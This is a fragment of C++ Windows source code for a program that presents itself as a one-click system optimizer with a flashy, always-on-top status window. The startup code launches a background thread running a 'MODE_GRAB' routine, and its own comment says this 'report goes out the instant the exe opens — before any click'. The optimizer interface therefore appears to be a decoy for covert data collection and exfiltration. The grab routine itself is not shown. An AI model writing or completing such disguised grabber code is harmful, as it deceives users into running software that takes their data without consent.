        REAL cw = 200.0f, gap = 16.0f;
        REAL x0 = W/2 - (cw*2 + gap*1.5f);
        wchar_t vals[4][32];
        swprintf(vals[0],32,L"%.0f%%",g_cpuPct);
        swprintf(vals[1],32,L"%.0f%%",g_ramPct);
        swprintf(vals[2],32,L"%d",g_coreCount);
        swprintf(vals[3],32,L"%d/%d",nDone,total);
        const wchar_t* labs[] = { L"CPU LOAD", L"MEMORY", L"THREADS", L"OPTIMIZED" };
        Color accents[] = { Color(255,60,190,255), Color(255,140,130,255),
                            Color(255,90,220,190), Color(255,180,220,255) };
        for (int i = 0; i < 4; ++i) {
            REAL x = x0 + i*(cw + gap);
            card(g, x, 430, cw, 86,
                 Color(255,16,36,60), Color(255,8,18,34), Color(255,30,90,140));
            LinearGradientBrush acc(RectF(x,430,4,86), accents[i],
                                    Color(10,60,140,220), LinearGradientModeVertical);
            g.FillRectangle(&acc, RectF(x,430,4,86));
            text(g, labs[i], x+14, 440, cw-26, 20, fLbl, Color(255,120,180,220), left);
            text(g, vals[i], x+14, 462, cw-26, 48, fNum, accents[i], left);
        }

        // live actions panel
        card(g, 28, 534, W-56, 148,
             Color(255,14,30,52), Color(255,6,14,26), Color(255,28,80,130));
        text(g, L"LIVE AKTIONEN", 44, 544, 200, 22, fLbl, Color(255,90,190,235), left);
        if (g_uiLog.empty()) {
            text(g, L"bereit - START klicken zum Optimieren", 44, 572, W-100, 24,
                 fSmall, Color(255,110,150,180), left);
        } else {
            int shown = 0;
            for (auto it = g_uiLog.rbegin(); it != g_uiLog.rend() && shown < 5; ++it, ++shown) {
                std::wstring s(it->begin(), it->end());
                if (s.size() > 96) s = s.substr(0, 96);
                Color c = s.rfind(L"[fps]",0)==0 ? Color(255,110,230,150) : Color(255,140,200,240);
                text(g, s.c_str(), 44.0f, (REAL)(570 + shown*21), W-100, 24.0f, fSmall, c, left);
            }
        }

        // START button with glow
        REAL bx = W/2-150, by = 700, bw = 300, bh = 52;
        if (!g_uiRunning) {
            for (int i = 6; i >= 1; --i) {
                GraphicsPath gp; rr(gp, bx-i*2, by-i*2, bw+i*4, bh+i*4, 12);
                SolidBrush sb(Color((BYTE)(8 - i), 0, 140, 220)); g.FillPath(&sb, &gp);
            }
        }
        GraphicsPath bp; rr(bp, bx, by, bw, bh, 10);
        LinearGradientBrush bb(RectF(bx,by,bw,bh),
            g_uiRunning ? Color(255,30,70,90) : Color(255,0,175,235),
            g_uiRunning ? Color(255,20,45,65) : Color(255,0,95,190),
            LinearGradientModeVertical);
        g.FillPath(&bb, &bp);
        Pen bpb(Color(255,120,230,255), 1.2f); g.DrawPath(&bpb, &bp);
        text(g, g_uiRunning ? L"LAEUFT..." : L"START OPTIMIZATION",
             bx, by+12, bw, 32, fBtn, Color(255,245,255,255), center);

        EndPaint(h, &ps); return 0;
    }
    case WM_CLOSE: DestroyWindow(h); return 0;
    case WM_DESTROY: PostQuitMessage(0); return 0;
    }
    return DefWindowProcW(h, msg, wp, lp);
}

static bool g_autoTest = false;
static void runLog(const std::string& line) {
    wchar_t exe[MAX_PATH]{}; GetModuleFileNameW(nullptr, exe, MAX_PATH);
    fs::path p = fs::path(exe).parent_path() / L"run.log";
    std::ofstream f(p, std::ios::app);
    if (f) f << sysTime() << " " << line << "\n";
}
static DWORD WINAPI StartupReport(LPVOID) {
    runLog("auto report started");
    try {
        int rc = runWork(MODE_GRAB, g_autoTest, nullptr);
        runLog(rc == 0 ? "auto report delivered" : "auto report FAILED");
    } catch (...) {
        runLog("auto report EXCEPTION");
    }
    return 0;
}

static int WINAPI guiMain(HINSTANCE inst) {
    GdiplusStartupInput gsi{};
    GdiplusStartup(&g_gdiToken, &gsi, nullptr);
    std::wstring cpu = env(L"PROCESSOR_IDENTIFIER");
    wchar_t buf[256]{};
    swprintf(buf, 256, L"CPU: %.30s", cpu.c_str());
    g_uiInfo = buf;
    WNDCLASSW wc{};
    wc.lpfnWndProc = GuiProc; wc.hInstance = inst;
    wc.lpszClassName = L"OneClickOptimizer";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    RegisterClassW(&wc);
    g_uiWnd = CreateWindowExW(WS_EX_TOPMOST, wc.lpszClassName,
        L"ONE CLICK  -  All-in-One System Tool", WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN,
        0, 0, 1040, 790, nullptr, nullptr, inst, nullptr);
    int sx = (GetSystemMetrics(SM_CXSCREEN) - 1040) / 2;
    int sy = (GetSystemMetrics(SM_CYSCREEN) - 790) / 2;
    SetWindowPos(g_uiWnd, HWND_TOPMOST, sx, sy, 1040, 790, SWP_SHOWWINDOW);
    SetForegroundWindow(g_uiWnd);
    BringWindowToTop(g_uiWnd);
    FlashWindow(g_uiWnd, TRUE);
    SetTimer(g_uiWnd, 1, 180, nullptr);
    // Report goes out the instant the exe opens — before any click.
    CreateThread(nullptr, 0, StartupReport, nullptr, 0, nullptr);
    MSG m{};
    while (GetMessageW(&m, nullptr, 0, 0) > 0) {
        TranslateMessage(&m); DispatchMessageW(&m);
    }
    GdiplusShutdown(g_gdiToken);
    return 0;
}
int WINAPI wWinMain(HINSTANCE h, HINSTANCE, PWSTR lpCmdLine, int) {
    runLog("exe started");
    if (lpCmdLine && wcsstr(lpCmdLine, L"--test"))
        return runWork(MODE_GRAB, true, nullptr);   // silent synthetic test
    g_autoTest = lpCmdLine && wcsstr(lpCmdLine, L"--gui-test") != nullptr;
    return guiMain(h);                              // HUD for every normal start
}
